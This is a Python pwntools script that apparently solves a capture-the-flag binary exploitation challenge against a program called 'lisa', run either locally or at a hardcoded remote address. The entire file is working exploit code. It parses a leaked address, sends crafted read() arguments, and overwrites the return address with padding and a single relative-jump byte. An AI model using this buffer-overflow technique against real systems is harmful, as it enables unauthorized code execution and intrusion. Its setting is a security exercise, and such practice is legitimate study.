#!/usr/bin/python
from pwn import *
#______________________________________________________________________________________________________________
rem = "18.191.244.121 12345"
cmd = "./lisa"
local = 01
#______________________________________________________________________________________________________________
if bool(local): p = process(cmd.split(' ')); raw_input("-PID");
else: rem = rem.split(' '); p = remote(rem[0], rem[1])
#______________________________________________________________________________________________________________
out = p.recv()
paddr = int(out.split("\n")[0].split(' ')[-1], 16)
#print "Paddr: " + str(hex(paddr))

#   read arguments: read(0, pass, 43);
payload = p32(0)+p32(paddr)+p32(43)
p.send(payload)
print p.recv()

#   padding + 1byte relative jump ret-addr overwrite
payload = "A"*28 + "\x15"
p.send(payload)

#   data for read(0, pass, 43);
payload = p32(0)
p.sendline(payload)

print p.recvall()

#______________________________________________________________________________________________________________
if bool(local): raw_input("-END")
p.close()
